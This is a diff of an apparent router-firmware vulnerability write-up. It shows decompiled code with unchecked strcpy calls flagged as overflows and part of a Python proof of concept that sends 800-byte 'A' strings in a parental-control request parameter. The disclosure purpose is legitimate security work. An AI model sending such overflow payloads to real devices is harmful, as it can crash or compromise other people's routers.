@@ -99,7 +99,7 @@ void saveParentControlInfo(undefined4 param_1)
   SetValue("filter.url.en",&DAT_000eddc8);
   SetValue("filter.mac.en",&DAT_000eddc8);
   strcpy(local_54 + 2,local_28);  //here is overflow
-  strcpy(local_54 + 0x22,local_30); //here is overflow
+  strcpy(local_54 + 0x22,local_30);
   ...
 }
 ```
@@ -110,7 +110,6 @@ import requests
 
 
 cmd  = b'deviceId=' + b'A' * 800 + '&enable=&time=&url_enable=&urls=&day=&block=&connectType=&limit_type='
-# or cmd  = b'deviceId=&enable=&time=' + b'A' * 800 + '&url_enable=&urls=&day=&block=&connectType=&limit_type='
 cmd += b'&deviceName='
 
 
